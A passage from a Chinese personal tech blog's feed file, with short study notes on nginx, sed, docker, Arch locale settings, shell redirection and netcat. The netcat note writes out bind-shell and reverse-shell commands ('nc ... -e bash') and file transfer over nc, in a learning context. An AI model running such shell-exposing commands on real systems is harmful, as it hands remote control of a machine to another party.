class="hljs-attribute">server_name</span>     test.com    <span class="hljs-comment"># 这个是用来匹配的一个域名, 起到过滤作用</span><br>&#125;<br></code></pre></td></tr></table></figure><p>对 <code>server_name</code> 的解释, 先是 nginx 所在的服务器收到一个请求, 然后用 <code>server_name</code> 来比对这个请求上面的域名, 所以这个还是用来匹配, 应该是匹配成功了才会执行后面的命令.</p><h3 id="关于反向代理的-proxy-pass-指令"><a href="#关于反向代理的-proxy-pass-指令" class="headerlink" title="关于反向代理的 proxy_pass 指令"></a>关于反向代理的 <code>proxy_pass</code> 指令</h3><p>这个必须要加上协议, 不能只写域名或 IP.</p><p>比如要访问到 baidu, 就写:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">proxy_pass https:<span class="hljs-regexp">//</span>baidu.com;<br></code></pre></td></tr></table></figure><h3 id="关于-location"><a href="#关于-location" class="headerlink" title="关于 location"></a>关于 location</h3><p>location 部分只能写在 server 里面.</p><h3 id="对所有-server-块的全局配置"><a href="#对所有-server-块的全局配置" class="headerlink" title="对所有 server 块的全局配置"></a>对所有 server 块的全局配置</h3><p>写在所有 server 块之外就好了.</p><h3 id="关于-return-命令的用法"><a href="#关于-return-命令的用法" class="headerlink" title="关于 return 命令的用法"></a>关于 return 命令的用法</h3><p>可返回状态码, 变量值, 实现域名跳转.</p><p>如:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">location</span> <span class="hljs-title">/ &#123;</span><br><span class="hljs-title">    return</span> <span class="hljs-number">302</span> https://www.baidu.com<br>&#125;<br></code></pre></td></tr></table></figure><p>就是直接跳转到 baidu.</p>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-sed-的一些技巧</title>
    <link href="/2022/09/29/%E5%85%B3%E4%BA%8E-sed-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/09/29/%E5%85%B3%E4%BA%8E-sed-%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="使用-的作用"><a href="#使用-的作用" class="headerlink" title="使用 {} 的作用"></a>使用 <code>&#123;&#125;</code> 的作用</h1><p>主要目的就是为了使 <mark>寻址</mark> 作用于多条命令.</p><h1 id="用到-反斜线的地方"><a href="#用到-反斜线的地方" class="headerlink" title="用到 \ 反斜线的地方"></a>用到 <code>\</code> 反斜线的地方</h1><p>只有 <code>i\</code> (insert), <code>a\</code> (append), <code>c\</code> (change), 这三个地方用到了反斜线.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决-Warning-Could-not-build-optimal-types_hash-问题</title>
    <link href="/2022/09/29/%E8%A7%A3%E5%86%B3-Warning-Could-not-build-optimal-types-hash-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/29/%E8%A7%A3%E5%86%B3-Warning-Could-not-build-optimal-types-hash-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>提升 <code>http</code> 代码块的下面的键的值:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">    http &#123;<br>    types_hash_max_size <span class="hljs-number">4096</span><span class="hljs-comment">;</span><br>    server_names_hash_bucket_size <span class="hljs-number">128</span><span class="hljs-comment">;</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>B站-nginx-资料</title>
    <link href="/2022/09/29/B%E7%AB%99-nginx-%E8%B5%84%E6%96%99/"/>
    <url>/2022/09/29/B%E7%AB%99-nginx-%E8%B5%84%E6%96%99/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://b23.tv/A8Z8w53">参考1</a></h1><p>架构, 加层处理.</p><h2 id="功能和部分概念"><a href="#功能和部分概念" class="headerlink" title="功能和部分概念"></a>功能和部分概念</h2><h3 id="正向代理和反向代理"><a href="#正向代理和反向代理" class="headerlink" title="正向代理和反向代理"></a>正向代理和反向代理</h3><p>正向代理, 代理客户端. 客户端的请求从代理处发给服务器.</p><p>反向代理, 代理服务端. 就如同向我们向 <code>www.baidu.com</code> 访问, 只有这一个域名, 实际上后面有很多服务器.</p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>轮循, 一个一个分配请求.</p><p>加权轮循, 通过权重来分配请求.</p><h3 id="iphash"><a href="#iphash" class="headerlink" title="iphash"></a>iphash</h3><p>来自一个 ip 的请求会始终传送到同一个服务器上 (解决会话无法共享导致的问题).</p><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>做缓存服务器以及 Session 共享.</p><h3 id="静态资源服务器"><a href="#静态资源服务器" class="headerlink" title="静态资源服务器"></a>静态资源服务器</h3><h2 id="讲解"><a href="#讲解" class="headerlink" title="讲解"></a>讲解</h2><p>80 端口是 http 的默认端口, 所以可以省略不写.</p><p>在打开 nginx 之后就可以在 localhost:80 处查看. 在配置文件中可以看到端口位置.</p><p>访问时需查看 80 端口是否开启. 是否设置了防火墙以及是否被占用.</p><p>nginx 的端口号配置到任何一个地方都是可以的.</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>有全局配置部分.</p><h1 id="参考2"><a href="#参考2" class="headerlink" title="参考2"></a><a href="https://b23.tv/fTxRPw7">参考2</a></h1><p>打开一个网页, 用 <code>F12</code> 进入开发者模式, 点击 Network, 查看 Reaponse Headers 中的 server 项, 可以知道这个网页是用什么搭建的.</p><p>反向代理, 将请求分发到公司的多台服务器上.</p><p>openresty, 在 nginx 的基础上集成了很多第三方插件. 其基于 nginx 和 lua.</p><h2 id="关于配置文件"><a href="#关于配置文件" class="headerlink" title="关于配置文件"></a>关于配置文件</h2><p>如:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span> localhost;<br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">root</span> html;<br>        <span class="hljs-attribute">index</span> index.html index.htm;<br>    &#125;<br><br>    <span class="hljs-attribute">error_page</span>  <span class="hljs-number">500</span> <span class="hljs-number">502</span> <span class="hljs-number">503</span> <span class="hljs-number">504</span> /50x.html;<br>    <span class="hljs-section">location</span> /50x.html &#123;<br>        <span class="hljs-attribute">root</span> html;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>index</code> 表明, 如果你没有提供文件名, 就会默认访问的文件, 这里为 <code>html/index.html</code></p><p><code>error_page</code> 表示错误页.</p>]]></content>
    
    
    <categories>
      
      <category>Nginx</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看-IP-是属于哪个国家和地区</title>
    <link href="/2022/09/28/%E6%9F%A5%E7%9C%8B-IP-%E6%98%AF%E5%B1%9E%E4%BA%8E%E5%93%AA%E4%B8%AA%E5%9B%BD%E5%AE%B6%E5%92%8C%E5%9C%B0%E5%8C%BA/"/>
    <url>/2022/09/28/%E6%9F%A5%E7%9C%8B-IP-%E6%98%AF%E5%B1%9E%E4%BA%8E%E5%93%AA%E4%B8%AA%E5%9B%BD%E5%AE%B6%E5%92%8C%E5%9C%B0%E5%8C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://unix.stackexchange.com/questions/7399/ip-to-country-console-command">参考</a></p><h1 id="查看公有-ip-地址"><a href="#查看公有-ip-地址" class="headerlink" title="查看公有 ip 地址"></a>查看公有 ip 地址</h1><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl http://ifconfig.io<br></code></pre></td></tr></table></figure><p>其输出一个 ip 地址.</p><p>指定一个 ip 查询其相关信息:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">curl</span> ipinfo.io/<span class="hljs-number">23.66.166.151</span><br></code></pre></td></tr></table></figure><p>后面接的 <code>23.66.166.151</code> 是 IP 地址. </p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shell-重定向时取地址符的含义</title>
    <link href="/2022/09/28/shell-%E9%87%8D%E5%AE%9A%E5%90%91%E6%97%B6%E5%8F%96%E5%9C%B0%E5%9D%80%E7%AC%A6%E7%9A%84%E5%90%AB%E4%B9%89/"/>
    <url>/2022/09/28/shell-%E9%87%8D%E5%AE%9A%E5%90%91%E6%97%B6%E5%8F%96%E5%9C%B0%E5%9D%80%E7%AC%A6%E7%9A%84%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://askubuntu.com/questions/959066/what-does-mean-exactly-in-output-redirection">参考1</a></h1><p>第一个:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>这里的 <code>&amp;</code> 表明 <code>1</code> 是一个文件描述符, 而不是一个文件名.</p><p>如果是:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">2&gt;1<br></code></pre></td></tr></table></figure><p>这会将标准错误流 (standard error) 输出到 <code>1</code> 这个文件中.</p><p>第二种:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&amp;&gt;<br></code></pre></td></tr></table></figure><p>这里的 <code>&amp;</code> 表示标准输出和标准错误输出, 即两者都一起重定向.</p><p>第三种:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">&gt;&amp;<br></code></pre></td></tr></table></figure><p>这个和 <code>&amp;&gt;</code> 的含义一样, 就是有点迷惑.</p><p>一下三个的含义相同:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">&amp;&gt;word</span><br>&gt;<span class="hljs-meta">&amp;word</span><br>&gt;word <span class="hljs-number">2</span>&gt;<span class="hljs-meta">&amp;1</span><br></code></pre></td></tr></table></figure><h1 id="群友提供"><a href="#群友提供" class="headerlink" title="群友提供"></a>群友提供</h1><p><img src="/../img/redirect.png" alt="redirect1"><br><img src="/../img/redirection2.png" alt="redirect2"></p>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki-Locale-部分</title>
    <link href="/2022/09/28/ArchWiki-Locale-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/28/ArchWiki-Locale-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Locale">ArchWiki 相关页面</a><br>glibc 和应用程序, 函数库, 使用 locale 设置来显示本地的文字, 货币, 时间, 日期, 特殊字符等包含地域属性的内容.</p><h1 id="生成区域设置"><a href="#生成区域设置" class="headerlink" title="生成区域设置"></a>生成区域设置</h1><p>列出所有启用的区域设置:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale -a<br></code></pre></td></tr></table></figure><p>启用一个区域设置前, 需要先生成它, 在 <code>/etc/locale.gen</code> 中取消对应的注释, 然后执行 <code>locale-gen</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale-gen<br></code></pre></td></tr></table></figure><h1 id="设置当前区域"><a href="#设置当前区域" class="headerlink" title="设置当前区域"></a>设置当前区域</h1><p>显示正在使用的 Locale 和相关环境变量:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ locale<br></code></pre></td></tr></table></figure><p>要使用的区域设置设置在 <code>locale.conf</code> 文件中.</p><p>查看已经生成的区域设置:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localedef --list-archive<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localectl list-locales<br></code></pre></td></tr></table></figure><h2 id="系统区域设置"><a href="#系统区域设置" class="headerlink" title="系统区域设置"></a>系统区域设置</h2><p>若要设置整个系统使用的区域设置, 需要在 <code>/etc/locale.conf</code> 中写入 <code>LANG</code> 变量.</p><p>设置:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ localectl set-locale LANG=zh_CN.UTF-8<br></code></pre></td></tr></table></figure><h2 id="在用户会话中覆盖系统区域设置"><a href="#在用户会话中覆盖系统区域设置" class="headerlink" title="在用户会话中覆盖系统区域设置"></a>在用户会话中覆盖系统区域设置</h2><p>若系统设置为中文, 你可以通过修改自己用户的配置使系统设置无效.</p><p>编辑 <code>~/.config/locale.conf</code> (即 <code>~/$XDG_CONFIG_HOME/locale.conf</code>)</p><p>这些 <code>locale.conf</code> 文件的优先级定义在 <code>/etc/profile.d/locale.sh</code> 中.</p><p>建立 <code>/etc/skel/.config/locale.conf</code> 文件, 可以让所有通过 useradd 命令和 <code>-m</code> 选项创建的新用户自动拥有一份相应的 <code>~/.config/locale.conf</code></p><h2 id="立即启用"><a href="#立即启用" class="headerlink" title="立即启用"></a>立即启用</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">unset</span> LANG<br>$ <span class="hljs-built_in">source</span> /etc/profile.d/locale.sh<br></code></pre></td></tr></table></figure><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><p>具体见 wiki.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>只需要先 <code>unset LANG</code>, 然后 <code>export LANG=zh_CN.UTF-8</code> 就可以切换语言.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录-archlinux-的容器无法使用-systemctl</title>
    <link href="/2022/09/27/%E8%AE%B0%E5%BD%95-archlinux-%E7%9A%84%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-systemctl/"/>
    <url>/2022/09/27/%E8%AE%B0%E5%BD%95-archlinux-%E7%9A%84%E5%AE%B9%E5%99%A8%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8-systemctl/</url>
    
    <content type="html"><![CDATA[<p>若使用一下命令:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">systemctl <span class="hljs-literal">start</span> xinetd<br></code></pre></td></tr></table></figure><p>则会报错如下:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">System has <span class="hljs-built_in">not</span> been booted <span class="hljs-keyword">with</span> systemd <span class="hljs-keyword">as</span> init system (PID <span class="hljs-number">1</span>). Can<span class="hljs-comment">&#x27;t operate.</span><br>Failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> bus: Host <span class="hljs-built_in">is</span> down   <br></code></pre></td></tr></table></figure><p>其报错即原因.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>docker-自动退出解决</title>
    <link href="/2022/09/27/docker-%E8%87%AA%E5%8A%A8%E9%80%80%E5%87%BA%E8%A7%A3%E5%86%B3/"/>
    <url>/2022/09/27/docker-%E8%87%AA%E5%8A%A8%E9%80%80%E5%87%BA%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.php.cn/docker/490893.html">参考</a></p><h1 id="docker-会自动退出的原因"><a href="#docker-会自动退出的原因" class="headerlink" title="docker 会自动退出的原因"></a>docker 会自动退出的原因</h1><ul><li>docker 容器没有前台进程, 容器认为空闲, 所以退出</li><li>没有一直挂起的命令</li></ul><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>加一个 <code>bin/bash</code> 让容器运行.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看-docker-容器的-ip</title>
    <link href="/2022/09/27/%E6%9F%A5%E7%9C%8B-docker-%E5%AE%B9%E5%99%A8%E7%9A%84-ip/"/>
    <url>/2022/09/27/%E6%9F%A5%E7%9C%8B-docker-%E5%AE%B9%E5%99%A8%E7%9A%84-ip/</url>
    
    <content type="html"><![CDATA[<p><a href="t.zoukankan.com/halberd-lee-p-12519294.html">参考</a></p><h1 id="获取单个容器的-IP"><a href="#获取单个容器的-IP" class="headerlink" title="获取单个容器的 IP"></a>获取单个容器的 IP</h1><p>可以使用命令:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect --format &#x27;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">.NetworkSettings.IPAddress</span> &#125;&#125;</span><span class="language-xml">&#x27; <span class="hljs-tag">&lt;<span class="hljs-name">container-ID</span>&gt;</span> </span><br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker inspect &lt;container <span class="hljs-built_in">id</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">range</span> .NetworkSettings.Networks&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.IPAddress</span>&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">end</span>&#125;&#125;</span><span class="language-xml">&#x27; container_name_or_id</span><br></code></pre></td></tr></table></figure><h1 id="获取所有哦容器的-IP"><a href="#获取所有哦容器的-IP" class="headerlink" title="获取所有哦容器的 IP"></a>获取所有哦容器的 IP</h1><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$ docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml"> - </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.IPAddress</span> &#125;&#125;</span><span class="language-xml">&#x27; $(docker ps -aq)</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>若无输出, 表示该 comtainer 没有 IP 地址.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在-ENTRYPOINT-中用-exec-的作用</title>
    <link href="/2022/09/26/%E5%9C%A8-ENTRYPOINT-%E4%B8%AD%E7%94%A8-exec-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/09/26/%E5%9C%A8-ENTRYPOINT-%E4%B8%AD%E7%94%A8-exec-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/32255814/what-purpose-does-using-exec-in-docker-entrypoint-scripts-serve">参考</a><br>在 shell 脚本中使用 <code>exec</code>, 如: <code>exec gosu redis &quot;$@&quot;</code>. 其会替换掉父进程, 而不是运行两个进程.</p><p>没有 <code>exec</code> 的话, parent shell 会 process survives 然后等待子进程 exit.</p><p>一个用户的回复:</p><p>without exec:</p><ul><li>parent shell starts</li><li>parent shell forks child<ul><li>child runs</li><li>child exit</li></ul></li><li>parent shell exit</li></ul><p>with exec:</p><ul><li>parent shell starts</li><li>parent shell forks child, replaces itself with child</li><li>child program runs taking over the shell’s process</li><li>child exits</li></ul>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>每次-docker-启动容器时都会让该容器执行某个脚本</title>
    <link href="/2022/09/26/%E6%AF%8F%E6%AC%A1-docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E6%97%B6%E9%83%BD%E4%BC%9A%E8%AE%A9%E8%AF%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E6%9F%90%E4%B8%AA%E8%84%9A%E6%9C%AC/"/>
    <url>/2022/09/26/%E6%AF%8F%E6%AC%A1-docker-%E5%90%AF%E5%8A%A8%E5%AE%B9%E5%99%A8%E6%97%B6%E9%83%BD%E4%BC%9A%E8%AE%A9%E8%AF%A5%E5%AE%B9%E5%99%A8%E6%89%A7%E8%A1%8C%E6%9F%90%E4%B8%AA%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/59871513/how-can-i-make-the-docker-container-to-run-a-script-every-time-when-the-containe">参考 stackoverflow</a><br>在构建 Dockerfile 时使用 <code>ENTRYPOINT</code>, 其作用就是每次 container 被启动时都会执行这后面的命令.</p>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nmtui-命令配置网络服务</title>
    <link href="/2022/09/26/nmtui-%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1/"/>
    <url>/2022/09/26/nmtui-%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-CNSS-PWN-方向获取题目</title>
    <link href="/2022/09/26/%E5%85%B3%E4%BA%8E-CNSS-PWN-%E6%96%B9%E5%90%91%E8%8E%B7%E5%8F%96%E9%A2%98%E7%9B%AE/"/>
    <url>/2022/09/26/%E5%85%B3%E4%BA%8E-CNSS-PWN-%E6%96%B9%E5%90%91%E8%8E%B7%E5%8F%96%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>比如题干要求:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">119.3</span>.<span class="hljs-number">83.106</span> <span class="hljs-number">10001</span><br></code></pre></td></tr></table></figure><p>这是用 netcat 进行连接, 连接好后并没有出现提示符, 可能没有设, 直接 <code>ls</code> 就可以看到文件.</p>]]></content>
    
    
    <categories>
      
      <category>CNSS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>nc-命令相关</title>
    <link href="/2022/09/26/nc-%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/09/26/nc-%E5%91%BD%E4%BB%A4%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="参考1"><a href="#参考1" class="headerlink" title="参考1"></a><a href="https://wangchujiang.com/linux-command/c/nc.html">参考1</a></h1><p>nc 命令是 netcat 的简称. 能够通过 TCP 和 UDP 在网络中读写数据.</p><h1 id="参考2-Wiki"><a href="#参考2-Wiki" class="headerlink" title="参考2 Wiki"></a><a href="https://en.wikipedia.org/wiki/Netcat">参考2 Wiki</a></h1><p>netcat 有很多功能, 如: 端口扫描, 传输文件, 端口监听等.</p><p>在 man page 中查看相关信息: <code>man netcat</code></p><h1 id="参考3-B站"><a href="#参考3-B站" class="headerlink" title="参考3 B站"></a><a href="https://b23.tv/ewf5t40">参考3 B站</a></h1><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>接受连接的一方:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc -lp <span class="hljs-number">10001</span> -e bash<br></code></pre></td></tr></table></figure><p>发起连接的一方:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">10001</span> <br></code></pre></td></tr></table></figure><p><code>nc</code> 加 IP 地址加端口号, 用于直接连接, 即正向连接. 我们知道需要被控制的一方的 IP 地址.</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>反向连接, 由受控方主动发起连接, 用 <code>-e</code> 参数将自己的 shell 返回给监听端.</p><p>需要连接 shell 的一方, 监听 233 端口:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc -lvp <span class="hljs-number">233</span><br></code></pre></td></tr></table></figure><p><code>-l</code> 是 <code>--listen</code> 这个参数即打开监听.</p><p><code>-v</code> 是 <code>--verbose</code>.</p><p><code>-p</code> 是 <code>--local-port</code> 指定本地的一个端口.</p><p>需要返回 shell 的一方:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span> <span class="hljs-number">233</span> -e bash -v<br></code></pre></td></tr></table></figure><p><code>-e</code> 是 <code>--exec</code> 后面接一个命令, 表示在连接之后连接.</p><h2 id="传输"><a href="#传输" class="headerlink" title="传输"></a>传输</h2><p>使用重定向符 <code>&lt;</code> 和 <code>&gt;</code> 传输单个文件.</p><p>将文件放在监听窗口:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ nc -lvp <span class="hljs-number">233</span> &lt; test<span class="hljs-selector-class">.sql</span> -<span class="hljs-selector-tag">q</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>后面的 <code>-q 1</code> 表示在文件传输完 1 秒后断开连接.</p><p>获取文件:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ nc <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">233</span> &gt; <span class="hljs-keyword">test</span>.sql -v<br></code></pre></td></tr></table></figure><p>这里的 <code>test.sql</code> 应该是自己命名吧.</p><h3 id="将文件压缩后传输"><a href="#将文件压缩后传输" class="headerlink" title="将文件压缩后传输"></a>将文件压缩后传输</h3><p>如:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> tar -cvf - <span class="hljs-keyword">file</span>/ | nc -lvp <span class="hljs-number">233</span><br></code></pre></td></tr></table></figure><p>这里的 <code>tar</code> 的三个参数, <code>-c</code> 为 <code>--create</code>, 即创建一个 archive. <code>-v</code> 为 <code>--verbose</code>, 即会显示很多信息. <code>-f</code> 是 <code>--file</code> 即指定要压缩的文件.</p><h3 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h3><p>如:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">$ nc -v <span class="hljs-number">192.168</span>.<span class="hljs-number">1.102</span> <span class="hljs-number">233</span> <span class="hljs-string">| tar -xvf -</span><br></code></pre></td></tr></table></figure><p>这里的解压命令, <code>-x</code> 表示 <code>--extract</code>, 表示解压.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Git-push-时-pre-recieve-hook-declined-问题</title>
